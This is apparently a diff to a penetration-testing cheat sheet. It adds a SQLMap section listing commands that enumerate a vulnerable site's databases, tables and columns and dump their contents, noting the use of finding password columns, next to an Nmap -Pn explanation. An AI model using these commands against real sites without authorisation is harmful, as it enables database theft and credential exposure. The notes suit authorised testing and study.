@@ -163,6 +163,19 @@ Your typical Windows host will, with its default firewall, block all ICMP packet
 
 So, we need a way to get around this configuration. Fortunately Nmap provides an option for this: -Pn, which tells Nmap to not bother pinging the host before scanning it. This means that Nmap will always treat the target host(s) as being alive, effectively bypassing the ICMP block; however, it comes at the price of potentially taking a very long time to complete the scan (if the host really is dead then Nmap will still be checking and double checking every specified port).
 
+## SQLMap
+
+In below commands, url should contain atleast 1 parameter field.
+```text
+To find out databases                                   sqlmap -u {url} --dbs
+To find table in a database                             sqlmap -u {url} -D {db_name} --tables
+TO find out columns in a database (Useful to 
+check if there is any password column in no. 
+of tables)                                              sqlmap -u {url} -D {db_name} -T {table_name} --columns
+Dump entries of specific column	                        sqlmap -u {url} -D {db_name} -T {table_name} -C {column_name} --dump
+Dump whole data of a table	                            sqlmap -u {url} -D {db_name} -T {table_name} --dump
+```
+
 # Information Gathering Tools
 - Sublist3r
 - hunter.io
